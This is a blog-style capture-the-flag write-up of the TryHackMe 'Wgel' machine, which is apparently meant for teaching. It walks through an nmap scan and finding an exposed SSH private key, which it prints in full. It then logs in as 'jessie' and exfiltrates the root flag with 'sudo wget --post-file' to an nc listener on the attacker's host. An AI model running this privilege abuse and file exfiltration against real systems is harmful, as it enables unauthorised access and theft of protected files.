---
title: Wgel - TryHackMe
date: 2020/08/07
categories:
  - [pentesting, writeups]
---

Hey there! Today I am going to walk you through the Wgel machine on [TryHackMe](https://tryhackme.com/room/wgelctf)

The first thing I always do is to export the IP to a global variable. So from now on \$IP will refer to the IP of the target machine.

```bash
export IP={Machine IP}
```

## Enumeration

Let us start our enumeration as usual and do an nmap scan:

```bash
nmap -T4 -A $IP
```

This is what came back:

```plain
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-07 09:47 EDT
Nmap scan report for 10.10.54.255
Host is up (0.051s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=8/7%OT=22%CT=1%CU=42515%PV=Y%DS=2%DC=T%G=Y%TM=5F2D5B8F
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=RD%TS=A)SEQ(SP=1
OS:05%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O
OS:3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=
OS:68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSN
OS:W6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   52.28 ms 10.9.0.1
2   52.35 ms 10.10.54.255

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.73 seconds
```

So just SSH on port 22 and Apache on port 80. Let us first do some enumeration on the web server.<br/>On first glance there is just the Apache default page. If we have a look at the source code we can see that there is a comment inside:

```html
<!-- Jessie don't forget to udate the webiste -->
```

Apparently someone called Jessie is a developer or user of the target machine.

But let us run dirbuster and see if there is more to find.

At **/sitemap/** there is a blog like website with the title “unapp” but I did not find anything interesting there nor any exploits. So let us move on.

Weirdly my scan did not find anything, but I poked around a bit more and just tried random directories and files. So I stumbled upon this: **/sitemap/.ssh/id_rsa**.

```plain
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----
```

It is an SSH private key you can use to login to someones SSH.<br/>I went ahead and copied the key to a file called **id_rsa** and gave it the permissions SSH likes.

```bash
chmod 600 id_rsa
```

## Gaining Access

Now we can use that previously found key to login to SSH. The only thing we are missing is a user to map that key to. In this case the server would be even vulnerable to an exploit to enumerate all the users on a server, but because we found something for “Jessie” earlier, I assumed, that the key was Jessie’s.<br/>So let’s login as Jessie with the private key.

```bash
ssh -i id_rsa  jessie@$IP
```

### User Flag

The user flag was hidden inside of the “Documents” directory.

```bash
jessie@CorpOne:~$ ls
Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos

jessie@CorpOne:~$ cd Desktop/
jessie@CorpOne:~/Desktop$ ls

jessie@CorpOne:~/Desktop$ cd ..
jessie@CorpOne:~$ cd Documents/
jessie@CorpOne:~/Documents$ ls
user_flag.txt

jessie@CorpOne:~/Documents$ cat user_flag.txt
USER_FLAG
```

## Post Exploitation & Getting Root

Before uploading linpeas or anything else I fancied, I just had a look at our sudo permissions myself.

```plain
jessie@CorpOne:~/Documents$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

Interesting, apparently we can run **wget** as root without a password. So as always I had a look at [GTFOBins](https://gtfobins.github.io/) and found [this](https://gtfobins.github.io/gtfobins/wget/) for wget.

### Root Flag

It seems like we can download files to another machine. We can use that knowledge to directly exfiltrate the root flag.<br/>(Trust me it took me ages to figure that one out. I first tried to download /etc/shadow and simliar.)

So on my machine I listened for incoming connections on port 80 and stored the output in a file called “root_flag.txt”:

```plain
root@hades      :~/ctf/thm/wgel# nc -lnvp 80 > root_flag.txt
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.54.255.
Ncat: Connection from 10.10.54.255:36442.
```

On the target machine I used wget with the “–post-file” flag to send the root flag to my machine.

```bash
jessie@CorpOne:~/Documents$ sudo /usr/bin/wget --post-file=/root/root_flag.txt $YOUR_IP
--2020-08-07 18:11:21--  http://$YOUR_IP/
Connecting to $YOUR_IP:80... connected.
HTTP request sent, awaiting response...
```

You should now be able to cat out the root flag in the “root_flag.txt” file.

```bash
root@hades:~/ctf/thm/wgel# cat root_flag.txt
ROOT_FLAG
```

## The End

And there you have it! I hope you had fun, I know I did 🦄
